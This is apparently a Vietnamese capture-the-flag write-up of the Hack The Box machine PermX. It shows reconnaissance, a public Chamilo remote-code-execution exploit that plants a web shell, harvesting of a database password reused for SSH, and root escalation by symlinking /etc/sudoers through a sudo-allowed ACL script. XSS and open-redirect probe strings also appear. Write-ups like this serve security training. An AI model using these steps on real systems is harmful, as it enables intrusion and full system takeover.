# PermX

<img width="1400" height="647" alt="image" src="https://github.com/user-attachments/assets/3baf14d4-b303-4e82-b62b-6d9d25ac0149" />

Đầu tiên thì tôi dùng nmap để quét các port đang có:
```
❯ sudo nmap -sV 10.10.11.23
[sudo] password for namdeptrai: 
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-12 14:00 +0700
Nmap scan report for permx.htb (10.10.11.23)
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.31 seconds
```
Tôi truy cập vào địa chỉ ip thì xuất dẫn đến đường dẫn `http://permx.htb/`, trỏ trong `/etc/hosts` rồi tiếp tục truy cập vào:

<img width="1873" height="958" alt="image" src="https://github.com/user-attachments/assets/49336f5e-1450-468f-9f2b-5341f915ddd9" />

Sau khi fuzz các directory trong website thì không thấy ra cái gì hữu ích, tôi thử fuzz subdomain thì ra được:
```
❯ ffuf -u http://10.10.11.23/ -H 'Host: FUZZ.permx.htb' -w wordlist/subdomains-top1mil-20000.txt -mc 200,301,302,307,401,403 -ac -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.23/
 :: Wordlist         : FUZZ: /home/namdeptrai/wordlist/subdomains-top1mil-20000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,301,302,307,401,403
________________________________________________

lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 350ms]
WWW                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 45ms]
www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 6162ms]
:: Progress: [20000/20000] :: Job [1/1] :: 1179 req/sec :: Duration: [0:00:19] :: Errors: 0 ::
```
Ở đây là cái đáng chú ý là `lms`, tôi truy cập vào thì ra trang web này:

<img width="1876" height="770" alt="image" src="https://github.com/user-attachments/assets/b686726b-610d-432f-b450-c6090fbd51cd" />

Tôi tiếp tục fuzzing subdomain thì ra được rất nhiều thứ:
```
❯ ffuf -u "http://lms.permx.htb/FUZZ" -w wordlist/super_mega_wordlist.txt -fc 404,403,500

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://lms.permx.htb/FUZZ
 :: Wordlist         : FUZZ: /home/namdeptrai/wordlist/super_mega_wordlist.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404,403,500
________________________________________________

//////                  [Status: 200, Size: 19359, Words: 4910, Lines: 353, Duration: 61ms]
//////////              [Status: 200, Size: 19367, Words: 4910, Lines: 353, Duration: 62ms]
app                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 36ms]
app/                    [Status: 200, Size: 3764, Words: 235, Lines: 31, Duration: 38ms]
app/cache               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 37ms]
app/cache/              [Status: 200, Size: 1601, Words: 101, Lines: 20, Duration: 40ms]
app/config/parameters.yml.dist [Status: 200, Size: 1131, Words: 195, Lines: 36, Duration: 36ms]
app/config/security.yml [Status: 200, Size: 2802, Words: 778, Lines: 78, Duration: 38ms]
app/bootstrap.php.cache [Status: 200, Size: 103834, Words: 6758, Lines: 3364, Duration: 35ms]
app/logs                [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 36ms]
app/logs/               [Status: 200, Size: 750, Words: 52, Lines: 16, Duration: 37ms]
bin                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 37ms]
bin/                    [Status: 200, Size: 941, Words: 64, Lines: 17, Duration: 38ms]
bower.json              [Status: 200, Size: 1140, Words: 204, Lines: 48, Duration: 36ms]
certificates            [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 39ms]
.codeclimate.yml        [Status: 200, Size: 2545, Words: 325, Lines: 124, Duration: 36ms]
composer.json           [Status: 200, Size: 7006, Words: 1817, Lines: 204, Duration: 36ms]
composer.lock           [Status: 200, Size: 601063, Words: 251289, Lines: 16158, Duration: 35ms]
CONTRIBUTING.md         [Status: 200, Size: 5627, Words: 712, Lines: 114, Duration: 36ms]
custompages             [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 36ms]
documentation           [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 36ms]
documentation/          [Status: 200, Size: 3966, Words: 1051, Lines: 86, Duration: 36ms]
favicon.ico             [Status: 200, Size: 2462, Words: 3, Lines: 2, Duration: 38ms]
index.php?redirect=/\/evil.com [Status: 200, Size: 19403, Words: 4910, Lines: 353, Duration: 87ms]
index.php?appservlang=%3Csvg%2Fonload=confirm%28%27xss%27%29%3E [Status: 200, Size: 19463, Words: 4910, Lines: 353, Duration: 93ms]
index.php               [Status: 200, Size: 19356, Words: 4910, Lines: 353, Duration: 96ms]
index.php?r=students/guardians/create&id=1%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E [Status: 200, Size: 19551, Words: 4910, Lines: 353, Duration: 101ms]
index.php?redirect=//evil.com [Status: 200, Size: 19399, Words: 4910, Lines: 353, Duration: 103ms]
index.php/admin         [Status: 200, Size: 19492, Words: 4910, Lines: 353, Duration: 109ms]
license.txt             [Status: 200, Size: 1614, Words: 206, Lines: 36, Duration: 37ms]
LICENSE                 [Status: 200, Size: 35147, Words: 5836, Lines: 675, Duration: 36ms]
main/                   [Status: 200, Size: 94, Words: 4, Lines: 8, Duration: 37ms]
main                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 37ms]
plugin                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 36ms]
README.md               [Status: 200, Size: 8074, Words: 917, Lines: 208, Duration: 36ms]
robots.txt              [Status: 200, Size: 748, Words: 75, Lines: 34, Duration: 37ms]
.scrutinizer.yml        [Status: 200, Size: 2610, Words: 768, Lines: 90, Duration: 39ms]
src                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 36ms]
src/                    [Status: 200, Size: 932, Words: 64, Lines: 17, Duration: 38ms]
terms.php               [Status: 200, Size: 16127, Words: 4075, Lines: 320, Duration: 76ms]
.travis.yml             [Status: 200, Size: 4260, Words: 564, Lines: 119, Duration: 36ms]
user.php                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 44ms]
vendor                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 37ms]
vendor/                 [Status: 200, Size: 17167, Words: 1049, Lines: 99, Duration: 46ms]
vendor/composer/installed.json [Status: 200, Size: 544121, Words: 223094, Lines: 14386, Duration: 37ms]
?view=log               [Status: 200, Size: 19364, Words: 4910, Lines: 353, Duration: 58ms]
web                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 36ms]
web/                    [Status: 200, Size: 1310, Words: 88, Lines: 19, Duration: 37ms]
web.config              [Status: 200, Size: 5780, Words: 1119, Lines: 107, Duration: 37ms]
?wsdl                   [Status: 200, Size: 19356, Words: 4910, Lines: 353, Duration: 58ms]
:: Progress: [78884/78884] :: Job [1/1] :: 1058 req/sec :: Duration: [0:01:17] :: Errors: 2 ::
```
Trong số nhiều cái đáng chú ý thì có cái `README.md` là đáng chú ý nhất 

<img width="1401" height="601" alt="image" src="https://github.com/user-attachments/assets/800976a8-33b6-49f2-a92e-606a16795708" />

Và tôi biết được website này sử dụng công nghệ là `Chamilo 1.11.x`, bằng cách search google thì tôi tìm được 1 lỗi dẫn đến RCE là [đây](https://www.exploit-db.com/exploits/52083):

<img width="1126" height="492" alt="image" src="https://github.com/user-attachments/assets/c038dc28-7cfa-4af0-a366-4c28fc7d449b" />

Tôi lấy đoạn code về và khai thác:
```
❯ python3 exploit.py "http://lms.permx.htb/" "id"
[+] File uploaded successfully!
[+] Access the shell at: http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php?cmd=
[+] Command Output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Tôi tìm được 1 số thông tin nhạy cảm trong các file bao gồm username và password ở `/var/www/chamilo/app/config/configuration.php`
```
❯ python3 exploit.py "http://lms.permx.htb/" "cat /var/www/chamilo/app/config/configuration.php" | grep "configuration"
 * configuration.dist.php. That file is an exact copy of the config file at install time.
 * Besides the $_configuration, a $_settings array also exists, that
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
$_configuration['db_manager_enabled'] = false;
$_configuration['root_web'] = 'http://lms.permx.htb/';
$_configuration['root_sys'] = '/var/www/chamilo/';
$_configuration['url_append'] = '';
```
Cơ mà lúc tôi mở file `/etc/passwd` thì không có username là `chamilo`:
```
❯ python3 exploit.py "http://lms.permx.htb/" "cat /etc/passwd" | grep "bash"
root:x:0:0:root:/root:/bin/bash
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
```
Dùng mật khẩu cho user `mtz` để ssh vào:

<img width="1311" height="228" alt="image" src="https://github.com/user-attachments/assets/b4ab3695-c895-4021-9d53-4f80d3ff4190" />

Tôi check thì có file được chạy dưới quyền root mà không cần mật khẩu:
```
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
mtz@permx:~$ cat /opt/acl.sh 
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```
Đoạn script này cấp quyền file cho user như rwx, nó yêu cầu thư mục nằm trong `/home/mtz/` và cấm `..` để tránh path traversal, cơ mà đoạn script này chưa kiểm tra trường hợp sử dụng symlink

Tôi tạo symlink đến `/etc/sudoers` sau đó thực thi đoạn script để cấp quyền đọc và ghi, sau đó thêm quyền vào cho user `mtz` để leo lên root:
```
mtz@permx:~$ ln -sf /etc/sudoers /home/mtz/abcd
mtz@permx:~$ ls -la
total 32
drwxr-x--- 4 mtz  mtz  4096 Sep 12 07:13 .
drwxr-xr-x 3 root root 4096 Jan 20  2024 ..
lrwxrwxrwx 1 mtz  mtz    12 Sep 12 07:13 abcd -> /etc/sudoers
lrwxrwxrwx 1 root root    9 Jan 20  2024 .bash_history -> /dev/null
-rw-r--r-- 1 mtz  mtz   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 mtz  mtz  3771 Jan  6  2022 .bashrc
drwx------ 2 mtz  mtz  4096 May 31  2024 .cache
lrwxrwxrwx 1 root root    9 Jan 20  2024 .mysql_history -> /dev/null
-rw-r--r-- 1 mtz  mtz   807 Jan  6  2022 .profile
drwx------ 2 mtz  mtz  4096 Jan 20  2024 .ssh
-rw-r----- 1 root mtz    33 Sep 11 06:53 user.txt
mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/abcd 
mtz@permx:~$ ls -la
total 32
drwxr-x--- 4 mtz  mtz  4096 Sep 12 07:13 .
drwxr-xr-x 3 root root 4096 Jan 20  2024 ..
lrwxrwxrwx 1 mtz  mtz    12 Sep 12 07:13 abcd -> /etc/sudoers
lrwxrwxrwx 1 root root    9 Jan 20  2024 .bash_history -> /dev/null
-rw-r--r-- 1 mtz  mtz   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 mtz  mtz  3771 Jan  6  2022 .bashrc
drwx------ 2 mtz  mtz  4096 May 31  2024 .cache
lrwxrwxrwx 1 root root    9 Jan 20  2024 .mysql_history -> /dev/null
-rw-r--r-- 1 mtz  mtz   807 Jan  6  2022 .profile
drwx------ 2 mtz  mtz  4096 Jan 20  2024 .ssh
-rw-r----- 1 root mtz    33 Sep 11 06:53 user.txt
mtz@permx:~$ echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" >> /home/mtz/abcd
mtz@permx:~$ cat abcd 
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults	env_reset
Defaults	mail_badpass
Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults	use_pty

# This preserves proxy settings from user environments of root
# equivalent users (group sudo)
#Defaults:%sudo env_keep += "http_proxy https_proxy ftp_proxy all_proxy no_proxy"

# This allows running arbitrary commands, but so does ALL, and it means
# different sudoers have their choice of editor respected.
#Defaults:%sudo env_keep += "EDITOR"

# Completely harmless preservation of a user preference.
#Defaults:%sudo env_keep += "GREP_COLOR"

# While you shouldn't normally run git as root, you need to with etckeeper
#Defaults:%sudo env_keep += "GIT_AUTHOR_* GIT_COMMITTER_*"

# Per-user preferences; root won't have sensible values for them.
#Defaults:%sudo env_keep += "EMAIL DEBEMAIL DEBFULLNAME"

# "sudo scp" or "sudo rsync" should be able to use your SSH agent.
#Defaults:%sudo env_keep += "SSH_AGENT_PID SSH_AUTH_SOCK"

# Ditto for GPG agent
#Defaults:%sudo env_keep += "GPG_AGENT_INFO"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root	ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "@include" directives:

@includedir /etc/sudoers.d
mtz ALL=(ALL:ALL) NOPASSWD: /opt/acl.sh
mtz ALL=(ALL:ALL) NOPASSWD: ALL
mtz@permx:~$ sudo bash
root@permx:/home/mtz# cat /root/root.txt
f4203ef7c8d4049b9c627a53a49b3d22
```
